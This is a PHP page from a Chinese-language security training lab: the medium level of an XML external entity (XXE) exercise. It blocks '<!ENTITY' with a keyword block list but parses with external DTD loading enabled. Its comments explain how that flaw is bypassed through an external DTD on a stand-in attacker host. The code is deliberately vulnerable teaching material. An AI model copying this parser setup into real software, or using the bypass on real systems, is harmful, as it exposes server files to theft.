<?php
/**
 * XXE · medium 档
 *
 * 防护方式：检查请求体里是否出现 `<!ENTITY`，出现就拦下。
 *
 * ⚠️ 本文件是故意存在漏洞的教学代码，请勿在任何真实项目中使用这套写法。
 *
 * ══════════════════════════════════════════════════════════════════
 * 这个防护的方向是对的，但覆盖面错了
 * ══════════════════════════════════════════════════════════════════
 *
 * 「不许声明实体」确实是 XXE 的根源 —— 攻击者必须声明一个实体才能引用外部资源。
 *
 * 但问题是：**实体不一定要在文档里声明。**
 *
 * XML 的 DTD（文档类型定义）有两个位置：
 *
 *   ① 内部子集 —— 写在文档里的 `<!DOCTYPE order [ ... ]>` 里
 *        → 过滤器检查的就是这里
 *
 *   ② 外部子集 —— 写在另一个文件里，文档只用 SYSTEM 指向它
 *        `<!DOCTYPE order SYSTEM "http://attacker/evil.dtd">`
 *        → 过滤器**看不到**里面的内容
 *
 * 于是攻击者把实体声明挪到外部文件里，请求体里就只剩下一句
 * `<!DOCTYPE order SYSTEM "...">` —— 不含 `<!ENTITY`，过滤器放行，
 * 解析器却会去把那边的 DTD 拉下来、照着声明展开实体。
 *
 * **过滤器检查的是「文档里写了什么」，而解析器执行的是
 * 「文档 + 它引用的所有外部资源」的合并结果。**
 * 这两者范围不一致 —— 和前面几个场景的绕过是同一类问题。
 */

declare(strict_types=1);

require __DIR__ . '/../config.php';
require __DIR__ . '/../lib/layout.php';
require __DIR__ . '/../lib/paths.php';

const PROBE_FILE = 'xxe_probe.txt';

$xml = isset($_POST['xml']) ? (string) $_POST['xml'] : '';
$submitted = ($xml !== '');

$orderId = '';
$error = '';
$blockedBy = '';
$warnings = [];
$entityRead = false;

if ($submitted) {
    // ------------------------------------------------------------------
    // 防护：请求体里不能出现实体声明
    // ------------------------------------------------------------------
    $blacklist = ['<!ENTITY', '<!entity', '<! Entity'];
    foreach ($blacklist as $bad) {
        if (strpos($xml, $bad) !== false) {
            $blockedBy = $bad;
            break;
        }
    }

    if ($blockedBy !== '') {
        $error = '请求被拦截：不允许在文档内声明实体。';
    } else {
        libxml_use_internal_errors(true);

        // ------------------------------------------------------------------
        // 注意这里的第二个标志：LIBXML_DTDLOAD（加载外部 DTD）
        //
        // 这个标志不是随手加的 —— 真实项目里它很常见：
        // 有些 XML 格式靠 DTD 描述结构，需要把外部子集拉下来才能正确解析
        // （比如对接某些行业标准、兼容老系统的报文格式）。
        //
        // 但它同时把上面那个黑名单**彻底废掉了**：
        // 请求体里不需要写 `<!ENTITY`，实体声明放在外部 DTD 里就行。
        // ------------------------------------------------------------------
        $doc = @simplexml_load_string(
            $xml,
            'SimpleXMLElement',
            LIBXML_NOENT | LIBXML_DTDLOAD
        );

        if ($doc === false) {
            $error = 'XML 解析失败。';
        } else {
            $orderId = trim((string) $doc->id);
            $entityRead = ($orderId !== '' && $orderId !== '1001');
        }

        foreach (libxml_get_errors() as $e) {
            $warnings[] = trim($e->message);
        }
        libxml_clear_errors();
    }
}

/** 演示用的正常订单 */
$normalXml = "<?xml version=\"1.0\"?>\n<order>\n  <id>1001</id>\n</order>";

/** 绕过示例里用到的 DTD 地址（模拟攻击者自己那台服务器上的文件） */
$attackerDtd = 'attacker.dtd';
?>
<?php layout_header(
    'XXE · 难度 medium',
    '黑名单拦住的是「文档里写了什么」，拦不住「文档引用了什么」。'
); ?>

<?php render_level_switcher(
    ['low.php' => 'low', 'medium.php' => 'medium', 'high.php' => 'high'],
    basename(__FILE__)
); ?>

<div class="card">
  <h3 style="margin-top:0">这一档的防护</h3>
  <pre style="margin:10px 0 0">$blacklist = [<span class="s">'&lt;!ENTITY'</span>, <span class="s">'&lt;!entity'</span>, <span class="s">'&lt;! Entity'</span>];
foreach ($blacklist as $bad) {
    if (<span class="v">strpos</span>($xml, $bad) !== <span class="f">false</span>) { <span class="c">/* 拦截 */</span> }
}
$doc = <span class="v">simplexml_load_string</span>($xml, <span class="s">'SimpleXMLElement'</span>, <span class="f">LIBXML_NOENT</span> | <span class="f">LIBXML_DTDLOAD</span>);</pre>

  <h3>本档目标</h3>
  <p style="margin:0;font-size:14px;color:var(--muted)">
    和 low 档一样读到 <code><?= htmlspecialchars(PROBE_FILE) ?></code> 的内容，
    但这次请求体里<b>不能出现 <code>&lt;!ENTITY</code> 字样</b>。
  </p>
  <p class="hint" style="margin:12px 0 0">
    关键线索：注意解析参数里多了 <code>LIBXML_DTDLOAD</code>。
    想清楚「DTD 可以被放在哪里」，就知道该怎么绕过这个黑名单了。
  </p>
</div>

<div class="card">
  <form method="post" action="medium.php">
    <div class="row">
      <textarea name="xml" rows="7" style="flex:1;font-family:var(--mono);font-size:13px"
                placeholder='&lt;?xml version="1.0"?&gt;&#10;&lt;order&gt;&lt;id&gt;1001&lt;/id&gt;&lt;/order&gt;'
      ><?= htmlspecialchars($xml) ?></textarea>
    </div>
    <div class="row">
      <button type="submit">查询订单</button>
      <button type="submit" formnovalidate
              onclick="document.querySelector('textarea').value = <?= json_encode($normalXml, JSON_UNESCAPED_UNICODE) ?>">
        填入正常订单
      </button>
    </div>
  </form>
</div>

<?php if ($submitted): ?>
  <div class="card" style="<?= $entityRead ? 'border-color:#fecaca;background:var(--danger-soft)' : '' ?>">
    <h3 style="margin-top:0">解析结果</h3>

    <?php if ($blockedBy !== ''): ?>
      <p style="margin:0;color:var(--danger);font-weight:500">
        过滤器命中：<code><?= htmlspecialchars($blockedBy) ?></code> —— <?= htmlspecialchars($error) ?>
      </p>
    <?php elseif ($error !== ''): ?>
      <p style="margin:0;color:var(--danger);font-weight:500"><?= htmlspecialchars($error) ?></p>
    <?php else: ?>
      <div class="kv">
        <b>订单号（&lt;id&gt; 的内容）</b>
        <span class="mono" style="word-break:break-all">订单号：<b><?= htmlspecialchars($orderId !== '' ? $orderId : '(空)') ?></b></span>
      </div>

      <?php if ($entityRead): ?>
        <p style="margin:12px 0 0;color:var(--danger);font-weight:500">
          ★ 请求体里没有 <code>&lt;!ENTITY</code>，但外部实体照样被解析了 —— 黑名单被绕过
        </p>
      <?php endif; ?>

      <?php render_code_board(
          '解析出的文档结构',
          trim(print_r(json_decode(json_encode($doc), true), true))
      ); ?>
    <?php endif; ?>

    <?php if ($warnings): ?>
      <?php render_code_board('libxml 警告', implode("\n", array_slice($warnings, 0, 5))); ?>
    <?php endif; ?>
  </div>
<?php endif; ?>

<div class="card">
  <h3 style="margin-top:0">核心绕过点</h3>
  <div class="tbl-wrap">
    <table>
      <thead><tr><th style="width:24%">实体声明放在哪</th><th style="width:30%">请求体里有 <code>&lt;!ENTITY</code> 吗</th><th>过滤器 / 解析器各自看到什么</th></tr></thead>
      <tbody>
        <tr>
          <td>内部子集（文档内）</td>
          <td class="mono">有</td>
          <td>过滤器看得见 → <b>被拦</b></td>
        </tr>
        <tr>
          <td>外部子集（<code><?= htmlspecialchars($attackerDtd) ?></code>）</td>
          <td class="mono">没有</td>
          <td>
            过滤器只看到 <code>&lt;!DOCTYPE order SYSTEM "..."&gt;</code> → <b>放行</b><br>
            解析器把 DTD 拉下来，照着里面的声明展开实体 → <b>读到文件</b>
          </td>
        </tr>
      </tbody>
    </table>
  </div>
  <p class="hint">
    <b>这是本场景最值得记住的一点：</b><br>
    过滤器检查的是「<b>文档里写了什么</b>」，<br>
    而解析器执行的是「<b>文档 + 它引用的所有外部资源</b>」的合并结果。<br>
    两者的<b>作用范围不一致</b> —— 这就是绕过点所在。
  </p>
</div>

<div class="card">
  <h3 style="margin-top:0">思路提示（不给答案）</h3>
  <ul style="margin:0;padding-left:20px;font-size:14px;color:var(--muted);line-height:1.9">
    <li>XML 的 DTD 只能写在文档内部吗？规范里还有没有别的位置？</li>
    <li><code>&lt;!DOCTYPE 根元素 SYSTEM "地址"&gt;</code> 这种写法是什么意思？</li>
    <li>如果 DTD 在另一个文件里，那么<b>那边</b>写 <code>&lt;!ENTITY&gt;</code> 还算不算「请求体里有」？</li>
    <li>本目录下有一个 <code><?= htmlspecialchars($attackerDtd) ?></code>，把它当成「攻击者服务器上的文件」来用。</li>
  </ul>
  <p class="hint">完整推导见 <code>writeups/xxe.md</code>。</p>
</div>

<?php layout_footer(); ?>
